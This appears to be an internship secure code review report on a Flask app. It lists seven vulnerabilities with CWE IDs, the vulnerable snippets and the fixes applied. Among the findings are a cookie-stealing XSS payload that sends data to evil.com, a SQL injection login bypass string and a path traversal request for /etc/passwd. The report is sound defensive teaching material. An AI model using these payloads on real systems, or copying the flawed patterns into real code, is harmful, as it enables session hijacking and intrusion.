# Secure Code Review Report — UserPortal (Flask Application)

**Project:** CodeAlpha Cyber Security Internship — Task 3
**Reviewer:** Fares (SOC Analyst, Tier 2)
**Target:** `app_before/app.py` (single-file Flask web application)
**Method:** Manual line-by-line review + automated static analysis (Bandit v1.9.4)
**Date:** 2026-09-08

---

## 1. Executive Summary

UserPortal is a minimal Flask application providing login, a welcome page,
file download, and a preferences endpoint. The review identified **7
vulnerabilities**, spanning **1 High**, **4 Medium**, and **2 Low** severity
findings. The most critical issues are a **debug-mode-enabled server bound
to all interfaces** and a **SQL injection** in the login flow — either one
is sufficient for full account or server compromise. All findings have been
remediated in `app_after/app.py`, and a follow-up Bandit scan confirms
**zero remaining issues** in the fixed version.

| Severity | Count |
|----------|-------|
| High     | 1     |
| Medium   | 4     |
| Low      | 2     |

## 2. Methodology

1. **Manual review** of every route handler for input handling, output
   encoding, authentication, and data storage logic.
2. **Automated static analysis** with [Bandit](https://bandit.readthedocs.io/),
   a Python-specific SAST tool, to cross-check the manual findings and catch
   anything missed.
3. Each finding below is mapped to a **CWE** (Common Weakness Enumeration)
   ID for standardized classification, and includes the vulnerable code,
   why it matters, and the exact fix applied.

## 3. Findings

### Finding 1 — SQL Injection (Critical logic, Medium per SAST confidence)
**CWE-89** · Location: `login()`, query built with an f-string

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Impact:** An attacker can submit a username like `' OR '1'='1` to bypass
authentication entirely, or extract/modify arbitrary data in the database.
**Fix:** Use parameterized queries so user input is always treated as data,
never as SQL syntax:
```python
cursor = conn.execute("SELECT password FROM users WHERE username = ?", (username,))
```

### Finding 2 — Plaintext Password Storage
**CWE-256** · Location: `init_db()`, `login()`

Passwords were stored and compared as plain text. If the database is ever
leaked (backup exposure, injection, misconfigured access), every
credential is immediately usable by an attacker — and since people reuse
passwords, the blast radius extends to other services.
**Fix:** Hash passwords with `werkzeug.security.generate_password_hash`
(PBKDF2 by default) on creation, and verify with
`check_password_hash()` — the plaintext password is never stored or compared directly.

### Finding 3 — Reflected Cross-Site Scripting (XSS)
**CWE-79** · Location: `welcome()`

```python
return render_template_string(f"<h1>Welcome, {name}!</h1>")
```

**Impact:** The `name` parameter is taken directly from the URL and
injected into HTML unescaped. A link like
`/welcome?name=<script>document.location='https://evil.com/?c='+document.cookie</script>`
executes attacker JavaScript in the victim's browser, enabling session
hijacking.
**Fix:** Pass user input as a template *variable* (not string-interpolated
into the template itself) and explicitly escape it with `markupsafe.escape()`
— Jinja2 auto-escaping plus explicit escaping closes the gap.

### Finding 4 — Path Traversal
**CWE-22** · Location: `download()`

```python
filepath = os.path.join("uploads", filename)
return send_file(filepath)
```

**Impact:** A request like `/download?file=../../etc/passwd` (or an
application config file, source code, etc.) walks out of the intended
`uploads/` directory, exposing arbitrary files readable by the server
process.
**Fix:** Sanitize the filename with `werkzeug.utils.secure_filename()` and
serve it via `send_from_directory()`, which additionally refuses to resolve
outside the given base directory.

### Finding 5 — Insecure Deserialization
**CWE-502** · Location: `load_preferences()`

```python
prefs = pickle.loads(raw)
```

**Impact:** `pickle.loads()` on attacker-controlled bytes can execute
arbitrary code during deserialization — this is a direct path to full
remote code execution, not merely a data-integrity issue.
**Fix:** Replace `pickle` with `request.get_json()`. JSON has no executable
payload — deserializing it can, at worst, produce malformed data, never
arbitrary code.

### Finding 6 — Hardcoded Secret Key
**CWE-798 / CWE-259** · Location: module scope

```python
app.secret_key = "dev12345"
```

**Impact:** Flask uses `secret_key` to cryptographically sign session
cookies. A hardcoded, guessable, or source-visible key lets an attacker
forge valid session cookies — including one that claims to be an
authenticated admin.
**Fix:** Load the key from an environment variable, generated once with
`secrets.token_hex(32)`, and fail startup loudly if it's missing rather
than silently falling back to a weak default.

### Finding 7 — Debug Mode Enabled on a Public Bind Address
**CWE-94 / CWE-605** · Location: `app.run(debug=True, host="0.0.0.0")`

**Impact:** Flask's debug mode exposes the interactive Werkzeug debugger
in the browser on any unhandled exception — which allows arbitrary Python
code execution from a web request. Combined with binding to `0.0.0.0`
(all network interfaces), this is remotely exploitable by anyone who can
reach the server, not just on localhost.
**Fix:** Debug mode and bind address are now controlled by environment
variables that default to **off** and **127.0.0.1** respectively, so a
developer has to explicitly opt in rather than accidentally ship a debug
server.

## 4. Static Analysis Summary (Bandit)

**Before remediation:**
```
Total issues (by severity):
    Low: 2   Medium: 3   High: 1
```

**After remediation:**
```
Total issues (by severity):
    Low: 0   Medium: 0   High: 0
No issues identified.
```

## 5. General Secure Coding Recommendations

- **Never build queries with string formatting.** Parameterized
  queries / an ORM should be the default, not an exception.
- **Hash, don't encrypt, passwords** — use a purpose-built KDF
  (`werkzeug.security`, `bcrypt`, or `argon2`), never reversible encryption
  or plaintext.
- **Escape all user-controlled output** rendered into HTML, even for
  "internal" or "trusted" fields — XSS most often comes from data nobody
  expected to be attacker-controlled.
- **Treat every file path built from user input as hostile** until it's
  been resolved and confirmed to stay inside an allowed directory.
- **Never deserialize untrusted data with `pickle`** (or `yaml.load`
  without `SafeLoader`, or PHP's `unserialize`). Prefer JSON for any data
  that crosses a trust boundary.
- **Keep secrets out of source control** — load them from environment
  variables or a secrets manager, and fail startup if they're missing.
- **Debug tooling belongs in development only** — gate it behind an
  environment flag that defaults to off, and never bind a debug server to
  a public interface.

## 6. Conclusion

All 7 findings identified through manual review and confirmed by Bandit
have been remediated in `app_after/app.py`, with a clean static-analysis
pass as verification. The patterns fixed here — injection, weak auth
storage, unescaped output, path traversal, unsafe deserialization, secret
management, and safe defaults — cover the large majority of vulnerability
classes seen in real-world web applications (they map closely to the
OWASP Top 10), making this review a useful reference checklist beyond this
specific codebase.
